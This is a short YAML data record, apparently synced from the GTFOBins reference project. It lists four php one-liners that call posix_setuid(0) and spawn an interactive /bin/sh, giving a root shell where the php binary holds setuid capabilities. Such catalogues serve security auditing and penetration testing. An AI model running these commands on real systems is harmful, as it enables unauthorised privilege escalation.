id: gtfobins/php/shell/capabilities
type: binary
platform: linux
name: php
phases:
- execution
- privilege-escalation
capabilities:
- shell
privilege_required: capability
sources:
- project: GTFOBins
  upstream_url: https://gtfobins.github.io
  license: MIT (verify upstream LICENSE)
  upstream_version: acd5246
  last_synced: '2026-08-25'
commands:
- template: php -r 'posix_setuid(0); system("/bin/sh -i");'
- template: php -r 'posix_setuid(0); passthru("/bin/sh -i");'
- template: php -r 'posix_setuid(0); $h=@popen("/bin/sh -i","r"); if($h){ while(!feof($h)) echo(fread($h,4096));
    pclose($h); }'
- template: php -r 'posix_setuid(0); pcntl_exec("/bin/sh");'
